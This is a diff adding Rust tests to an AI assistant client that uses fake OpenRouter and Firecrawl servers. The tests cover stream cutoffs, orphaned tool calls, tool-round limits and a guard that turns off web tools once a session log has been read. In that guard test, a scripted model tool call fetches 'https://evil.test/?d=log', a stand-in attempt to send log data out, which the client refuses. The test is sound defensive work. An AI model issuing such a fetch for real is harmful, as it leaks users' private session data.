@@ -504,3 +504,208 @@ async fn the_model_list_comes_from_the_service() {
         .unwrap_err();
     assert_eq!(err.to_string(), "No auth credentials found");
 }
+
+fn tool_names(body: &Value) -> Vec<String> {
+    body.get("tools")
+        .and_then(Value::as_array)
+        .map(|tools| {
+            tools
+                .iter()
+                .map(|t| t["function"]["name"].as_str().unwrap().to_owned())
+                .collect()
+        })
+        .unwrap_or_default()
+}
+
+/// A stream that ends without `[DONE]` or a finish reason.
+fn cut(chunks: &[Value]) -> Script {
+    let body: String = chunks
+        .iter()
+        .map(|chunk| format!("data: {chunk}\n\n"))
+        .collect();
+    Script::Reply {
+        status: 200,
+        content_type: "text/event-stream",
+        body,
+    }
+}
+
+#[tokio::test]
+async fn reading_a_session_turns_the_web_tools_off_for_the_rest_of_the_chat() {
+    let firecrawl = fake(vec![]).await;
+    let openrouter = fake(vec![
+        sse(&[call(
+            0,
+            Some("s1"),
+            Some("read_session"),
+            r#"{"machine_id":"m","agent":"a","session_id":"s"}"#,
+        )]),
+        sse(&[text("Read it.")]),
+        sse(&[call(
+            0,
+            Some("w1"),
+            Some("web_fetch"),
+            r#"{"url":"https://evil.test/?d=log"}"#,
+        )]),
+        sse(&[text("Cannot.")]),
+    ])
+    .await;
+    let dir = tempfile::tempdir().unwrap();
+    let setup = setup(dir.path(), &openrouter, Some(&firecrawl));
+    let mut chat = new_chat();
+    let (tx, _rx) = mpsc::channel(64);
+    let work = async |_: WorkQuery| Ok::<_, String>("log text".to_owned());
+    run_turn(&setup, &mut chat, "read".into(), &tx, work)
+        .await
+        .unwrap();
+    // A later prompt, on the chat as it was saved and loaded again.
+    let mut reopened = load_chat(dir.path(), chat.id).await.unwrap();
+    run_turn(&setup, &mut reopened, "now fetch".into(), &tx, work)
+        .await
+        .unwrap();
+    let seen = openrouter.seen.lock().unwrap();
+    assert!(
+        tool_names(&seen[0].body).contains(&"web_fetch".to_owned()),
+        "offered before a session is read"
+    );
+    assert!(
+        !tool_names(&seen[1].body)
+            .iter()
+            .any(|n| n.starts_with("web_")),
+        "off in the same turn"
+    );
+    assert!(
+        !tool_names(&seen[2].body)
+            .iter()
+            .any(|n| n.starts_with("web_")),
+        "off after reopening"
+    );
+    assert!(
+        seen[2].body["messages"][0]["content"]
+            .as_str()
+            .unwrap()
+            .contains("start a new chat")
+    );
+    let refused = seen[3].body["messages"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .find(|m| m["tool_call_id"] == "w1")
+        .unwrap();
+    assert!(
+        refused["content"]
+            .as_str()
+            .unwrap()
+            .contains("start a new chat")
+    );
+    assert!(
+        firecrawl.seen.lock().unwrap().is_empty(),
+        "nothing went out to Firecrawl"
+    );
+}
+
+#[tokio::test]
+async fn a_call_left_without_a_result_is_closed_before_the_next_prompt() {
+    let server = fake(vec![sse(&[text("ok")])]).await;
+    let dir = tempfile::tempdir().unwrap();
+    let setup = setup(dir.path(), &server, None);
+    let mut chat = new_chat();
+    chat.messages = vec![
+        Message::User {
+            text: "first".into(),
+        },
+        Message::Assistant {
+            text: String::new(),
+            reasoning: String::new(),
+            calls: vec![beep_assistant::Call {
+                id: "lost".into(),
+                name: "list_machines".into(),
+                arguments: "{}".into(),
+            }],
+        },
+    ];
+    let (tx, _rx) = mpsc::channel(64);
+    run_turn(&setup, &mut chat, "again".into(), &tx, no_work)
+        .await
+        .unwrap();
+    let seen = server.seen.lock().unwrap();
+    let sent = seen[0].body["messages"].as_array().unwrap();
+    assert_eq!(sent[3]["role"], "tool");
+    assert_eq!(sent[3]["tool_call_id"], "lost");
+    assert_eq!(sent[4]["content"], "again");
+}
+
+#[tokio::test]
+async fn a_stream_that_ends_early_is_an_error_and_keeps_its_text() {
+    let server = fake(vec![cut(&[text("Half of")])]).await;
+    let dir = tempfile::tempdir().unwrap();
+    let setup = setup(dir.path(), &server, None);
+    let mut chat = new_chat();
+    let (tx, _rx) = mpsc::channel(64);
+    let err = run_turn(&setup, &mut chat, "hi".into(), &tx, no_work)
+        .await
+        .unwrap_err();
+    assert_eq!(err.to_string(), "The reply was cut off.");
+    let saved = load_chat(dir.path(), chat.id).await.unwrap();
+    assert!(matches!(&saved.messages[1], Message::Assistant { text, .. } if text == "Half of"));
+}
+
+#[tokio::test]
+async fn a_finish_reason_without_done_is_a_whole_reply() {
+    let done = json!({"choices": [{"delta": {"content": "Whole"}, "finish_reason": "stop"}]});
+    let server = fake(vec![cut(&[done])]).await;
+    let dir = tempfile::tempdir().unwrap();
+    let setup = setup(dir.path(), &server, None);
+    let mut chat = new_chat();
+    let (tx, _rx) = mpsc::channel(64);
+    assert_eq!(
+        run_turn(&setup, &mut chat, "hi".into(), &tx, no_work)
+            .await
+            .unwrap(),
+        Outcome::Done
+    );
+}
+
+#[tokio::test]
+async fn a_huge_tool_call_index_is_refused() {
+    let server = fake(vec![sse(&[call(
+        4_000_000_000,
+        Some("x"),
+        Some("list_machines"),
+        "{}",
+    )])])
+    .await;
+    let dir = tempfile::tempdir().unwrap();
+    let setup = setup(dir.path(), &server, None);
+    let mut chat = new_chat();
+    let (tx, _rx) = mpsc::channel(64);
+    let err = run_turn(&setup, &mut chat, "hi".into(), &tx, no_work)
+        .await
+        .unwrap_err();
+    assert_eq!(err.to_string(), "The model sent too many tool calls.");
+}
+
+#[tokio::test]
+async fn calls_on_the_last_round_are_not_run() {
+    let scripts: Vec<Script> = (0..=MAX_TOOL_ROUNDS)
+        .map(|i| sse(&[call(0, Some(&format!("c{i}")), Some("list_projects"), "{}")]))
+        .collect();
+    let server = fake(scripts).await;
+    let dir = tempfile::tempdir().unwrap();
+    let setup = setup(dir.path(), &server, None);
+    let mut chat = new_chat();
+    let (tx, _rx) = mpsc::channel(256);
+    let runs = Mutex::new(0);
+    let work = async |_: WorkQuery| {
+        *runs.lock().unwrap() += 1;
+        Ok::<_, String>("[]".to_owned())
+    };
+    let outcome = run_turn(&setup, &mut chat, "loop".into(), &tx, work)
+        .await
+        .unwrap();
+    assert_eq!(outcome, Outcome::Done);
+    assert_eq!(*runs.lock().unwrap(), MAX_TOOL_ROUNDS);
+    assert!(
+        !matches!(chat.messages.last(), Some(Message::Assistant { calls, .. }) if !calls.is_empty())
+    );
+}
